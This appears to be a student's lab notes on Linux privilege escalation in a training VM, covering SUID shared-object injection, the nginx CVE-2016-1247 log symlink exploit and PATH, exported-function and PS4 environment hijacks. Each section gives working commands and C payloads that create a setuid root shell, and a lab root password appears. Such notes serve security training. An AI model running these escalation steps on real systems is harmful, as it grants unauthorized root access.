#Linux #PrivEsc #SUID #SharedObjectInjection #GTFOBins #sudo #symlinks   #CVE-2016-1247 #Nginx #EnvironmentVariables #Apache #gcc #Find #strings #env
https://gtfobins.github.io/
# Shared Object Injection
#SharedObjectInjection
## **Detection**
Linux VM

1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
2. From the output, make note of all the SUID binaries. e.g. `/usr/local/bin/suid-so`
3. In command line type:
`strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"`
4. From the output, notice that a .so file is missing from a writable directory.

## **Exploitation**
Linux VM

5. In command prompt type: `mkdir /home/user/.config`
6. In command prompt type: `cd /home/user/.config`
7. Open a text editor and type:
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

8. Save the file as `libcalc.c` (make sure to use tabs not spaces, sometimes errors out)
9. In command prompt type:
```
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c -static
```
10. In command prompt type: `/usr/local/bin/suid-so`
11. In command prompt type: `id`

---
# CTF Challenge

[[VulnUniversity - THM]]

---
# Symlinks
#symlinks

[Nginx Exploit](https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html)
#CVE-2016-1247 #Nginx

## **Detection**
Linux VM

1. In command prompt type: `dpkg -l | grep nginx`
2. From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3.
3. Run `find / -type f -perm -04000 -ls 2>/dev/null`
	1. SUID bit must be set on `/usr/bin/sudo` also to exploit nginx

## **Exploitation**

Linux VM – Terminal 1

1. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: `su root`
2. The root password is `password123`
3. Once escalated to root, in command prompt type: `su -l www-data`
4. In command prompt type:
```
/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
```
5. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.

Linux VM – Terminal 2

1. Once logged in, type: `su root`
2. The root password is `password123`
3. As root, type the following: `invoke-rc.d nginx rotate >/dev/null 2>&1`
4. Switch back to the previous terminal.

Linux VM – Terminal 1

1. From the output, notice that the exploit continued its execution.
2. In command prompt type: `id`

---

# Environment Variables #1
#EnvironmentVariables #Apache #find #strings 

## **Detection**
Linux VM

1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
2. From the output, make note of all the SUID binaries.
3. In command prompt type: `strings /usr/local/bin/suid-env`
4. From the output, notice the functions used by the binary.

## **Exploitation**
Linux VM

Read [this](https://gtfobins.github.io/gtfobins/env/) for simpler exploit...

1. In command prompt type:
```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
```
2. In command prompt type: `gcc /tmp/service.c -o /tmp/service -static`
3. In command prompt type: `export PATH=/tmp:$PATH`
4. In command prompt type: `/usr/local/bin/suid-env`
5. In command prompt type: `id`

---

# Environment Variables #2
#EnvironmentVariables #env #find #strings 

## **Detection**
Linux VM

1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
2. From the output, make note of all the SUID binaries.
3. In command prompt type: `strings /usr/local/bin/suid-env2`
4. From the output, notice the functions used by the binary.

## **Exploitation Method #1**
Linux VM

1. In command prompt type:
```
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
```
2. In command prompt type:
`export -f /usr/sbin/service`
3. In command prompt type: `/usr/local/bin/suid-env2`

## **Exploitation Method #2**
Linux VM

1. In command prompt type:
```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```